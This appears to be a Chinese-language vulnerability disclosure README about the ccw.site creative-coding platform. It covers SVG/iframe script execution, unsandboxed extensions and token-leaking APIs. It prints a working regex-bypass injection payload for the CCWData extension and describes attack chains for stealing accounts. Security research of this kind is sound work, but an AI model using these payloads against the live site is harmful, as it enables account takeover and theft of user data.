记录共创世界的前端代码注入漏洞和盗号接口。

> [!WARNING]  
> **仅供学习研究用途，请勿编写恶意代码，违者后果自负！**  

---

## SVG

1. 基于编辑造型或背景的代码注入攻击：  
    影响范围有限，仅对查看源代码的人有效。  
    参考 https://muffin.ink/blog/scratch-vulnerability-disclosure/  
    漏洞演示 https://www.ccw.site/detail/69f73e772a7d36316189ef73  

2. 基于 iframe + svg 的代码注入攻击：  
    ⚡立即中招，几乎没有反应时间。  
    如果在浏览器里直接用一个标签页打开 svg ，浏览器会执行 svg 里的 JS 脚本。同理，在没有保护措施的 iframe 里加载 svg 也会立即执行脚本。  
    已知登录 www.ccw.site 时的 Set-Cookie 响应头是这样的
    ```
    Set-Cookie: token=XXXXXXXXXXXXXXXX60816ba55659e776ec2d3be9; Path=/; Domain=.ccw.site; Max-Age=2592000; Expires=Tue, 02 Jun 2026 12:57:16 GMT; HttpOnly
    ```
    因此，在 m.ccw.site 加载的 svg 里执行的脚本可以携带有效的 token 请求 CCW 接口。  
    设想的场景：  
    黑客在 learn.ccw.site 使用 iframe 嵌入来自 m.ccw.site 的 svg ，然后这个 svg 里有恶意代码，并且会伪装，表面上看这好像就是个 iframe 在显示b站的视频，背后其实已经把浏览器自动填充的密码、手机号、实名认证的姓名、身份证前两位和后两位等信息打包并发送到黑客的服务器了。  
    这比加载 Gandi IDE 再执行恶意脚本还要快很多很多倍，受害者根本来不及反应。  

    <img width="2234" height="1304" alt="Image" src="https://github.com/user-attachments/assets/a4777792-ae52-4e1e-a44d-d5e5756f5571" />

    <img width="1116" height="651" alt="Image" src="https://github.com/user-attachments/assets/06c37f3e-3c94-4fbc-ad86-1e266ec7a49c" />

    <img width="1116" height="651" alt="Image" src="https://github.com/user-attachments/assets/299c38c1-4b46-4fdb-a3d0-18faa5da136e" />

---

## CCWData

扩展显示名称：Gandi云数据

该扩展有代码注入漏洞，且官方从未真正修复它，而是将它们标记为 `（❌过时的积木）` ，然后隐藏起来，因此仍然可以被利用，且不会触发任何警告。  

2026 年 3 月 9 日，官方修改了代码注入漏洞积木的逻辑，但并没有修复漏洞，攻击者仍然能拿到全局 `window` 对象，仍然可以[从 React 提取 scratch-vm](https://github.com/bddjr/getScratchVMFromReact) 。

如果您需要回滚到修改前的行为，请用 https://github.com/bddjr/CCWData-polyfill-eval 。

如果您想看旧版逻辑，请看 [before-20260309.md](before-20260309.md) 。

参考逆向代码文件 [20260309.scratch3_ccw_data.e7237e1f.prettyprint.js](20260309.scratch3_ccw_data.e7237e1f.prettyprint.js) 。

### getValueInJSON

```js
{
    key: "getValueInJSON",
    value: function(t) {
        var e, r = u().toString(t.KEY), a = u().toString(t.JSON);
        try {
            e = JSON.parse(a)
        } catch (t) {
            return "error: ".concat(t.message)
        }
        if (/[()=]/gm.test(r))
            return "error: invalid key ".concat(r, ", cannot contain ()=");
        var n, o = "jsonObj[".concat(r, "]");
        Array.isArray(e) ? r = r.startsWith("[") ? "jsonObj".concat(r) : "jsonObj[".concat(r, "]") : /\s/gm.test(r) ? (console.warn("[CCW Data] warning: invalid key ".concat(r, ", space and dot cannot be used together")),
        r = 'jsonObj["'.concat(r, '"]')) : r = "jsonObj.".concat(r);
        try {
            n = (0,
            y.Br)("return ".concat(r), {
                jsonObj: e
            })
        } catch (t) {
            try {
                n = (0,
                y.Br)("return ".concat(o), {
                    jsonObj: e
                })
            } catch (t) {
                return "error: key or expression invalid"
            }
        }
        return "object" === g(n) ? JSON.stringify(n) : n
    }
}
```

乍一看好像没啥问题，把 `key` 的 `()=` 这几个符号都过滤掉了，看起来好像没办法执行什么函数了……吗？  

ECMAScript 2015 新增了模板字符串功能，模板字符串可以执行函数，例如：

```js
String.raw`C:\Development\profile\aboutme.html`
```

经过我的研究，因为它输入给函数的参数0是一个数组，所以它不能直接调用 `eval` 执行字符串，  
但它可以调用 `Function` 以创建函数，然后执行函数。

```js
toString.constructor`window.Function=toString.constructor;var msg='注入代码测试';console.log(msg,arguments)``${jsonObj}`
```

只需要将字符串里的部分字符按照以下形式替换，就能绕过正则表达式的过滤：

> `(` -> `\x28`  
> `)` -> `\x29`  
> `=` -> `\x3d`  
> ` ` -> `\x20`  

于是我们就得到了：

```js
toString.constructor`window.Function\x3dtoString.constructor;var\x20msg\x3d'注入代码测试';console.log\x28msg,arguments\x29``${jsonObj}`
```

将这行代码填入 `args.KEY` 里，就可以执行想要的操作了。

当然了，返回值的类型仍受限制，您可以尝试重写 `JSON.stringify` 以返回对象。  

```js
window.Function = toString.constructor;
const jsonObj = arguments[1];
// 返回 rtObj 对象
const rtObj = {
    jsonObj,
    "114": "514"
};
const { stringify } = JSON;
JSON.stringify = function(o) {
    return o === rtObj ? (JSON.stringify = stringify, o) : stringify.apply(this, arguments)
};
return rtObj
```

```js
toString.constructor`window.Function\x3dtoString.constructor;const\x20jsonObj\x3darguments[1];const\x20rtObj\x3d{jsonObj,"114":"514"};const{stringify}\x3dJSON;JSON.stringify\x3dfunction\x28o\x29{return\x20o\x3d\x3d\x3drtObj?\x28JSON.stringify\x3dstringify,o\x29:stringify.apply\x28this,arguments\x29};return\x20rtObj``${jsonObj}`
```

以上代码配合 “当计时器 > -1” 的帽子，就可以在浏览器访问 creator 或 gandi 页面的链接后立即执行任意代码，或者在其它页面点击“立即运行”时立即执行任意代码。

### setValueInJSON

```js
{
    key: "setValueInJSON",
    value: function(t) {
        var e, r = u().toString(t.KEY), a = u().toString(t.VALUE), n = u().toString(t.JSON);
        try {
            e = JSON.parse(n)
        } catch (t) {
            return "error: ".concat(t.message)
        }
        if (/[()=]/gm.test(r))
            return "error: invalid key ".concat(r, ", cannot contain ()=");
        var o = a;
        if (/^[\[].*?[\]]$/gm.test(a) || /^[\{].*?[\}]$/gm.test(a))
            try {
                o = JSON.parse(a)
            } catch (t) {}
        "string" == typeof o && /^-?\d*\.?\d*$/gm.test(o) && (o = Number(o));
        try {
            Array.isArray(e) ? e[r] = o : /[\.\[\]]/gm.test(r) ? (0,
            y.Br)("jsonObj.".concat(r, " = valueObj;"), {
                jsonObj: e,
                valueObj: o
            }) : e[r] = o
        } catch (t) {
            return "error: key or expression invalid"
        }
        return JSON.stringify(e)
    }
}
```

从 2026 年 3 月 9 日 起，此处的漏洞和 `getValueInJSON` 的漏洞一致。

---

## 未上架的扩展

未上架的扩展就是第三方的脚本，它并没有运行在沙盒环境里，因此漏洞是十分明显的。

关于它的加载方式，有两种情况。

### detail页面

以前会在加载作品的时候直接执行第三方的脚本，然后才在用户点击 “立即运行” 的时候询问是否运行。  
这样的漏洞是非常明显的，脚本没有经过用户同意，就已经执行。  

现在在加载扩展之前就会警告，只有用户点击 “继续运行” 才会运行扩展的脚本，降低了安全风险。  

### 其它页面

其它页面例如：
> creator  
> gandi  
> embed

这些页面在加载项目的时候会立即加载并执行扩展脚本，不会经过用户同意，因此漏洞仍然明显。

攻击者可以利用 creator 或 gandi 会立即加载作品的特性，在加载作品的时候执行第三方扩展脚本。  
用户只需要访问创作页的链接，就会将自己的账号暴露在风险之中。  

对应的，在创作者学院的文章里，可以插入 iframe ，而 iframe 能立即访问 creator 或 gandi ，形成了漏洞链，用户仅需点开文章，就会暴露在风险之中。  

当然了，创作页执行上述操作，并不需要使用第三方扩展，只需要使用 CCWData 的代码注入漏洞，配合 “当计时器 > -1” 的帽子，就可以在浏览器访问链接后立即执行任意代码。

（iframe + Gandi 加载太慢了，不如用 iframe + svg）

---

## list_sessions接口

```
POST https://community-web.ccw.site/students/list_sessions?page=1&perPage=20&sortField=createdAt&sortType=DESC
```

这个接口的漏洞十分明显，攻击者只需要知道如何借助心跳接口获取 HmacMD5 的 key ，就可以搞定 A 请求头和 B 请求头，然后请求这个接口，获取当前用户的 token ，从而盗号。  
配合代码注入漏洞，形成漏洞攻击链。

CSense 的作者曾多次强调 CSense 无法盗取用户的密码，却隐瞒了这一事实。  
早期 CSense 利用该漏洞，将 CSense 使用者的登录信息和 token 发送给 CSense 的作者。

该漏洞在 2026 年 1 月 16 日 被修复，攻击者不能再借助该接口获取 token ，但仍可以获取登录时的时间、IP地址、浏览器版本。

---

## login接口

```
POST https://sso.ccw.site/web/auth/login-by-password
```

该接口会在用户登录时响应的 json 里暴露当前的 token ，但它不会被存储到本地。  

攻击者只能在用户登录的时候获取它，而且只能获取当前会话的 token 。  

但既然用户都在这时候登录了，当然可以直接获取用户输入的密码，所以该漏洞的影响有限，仅对于不使用密码登录的人来说会增加风险。  
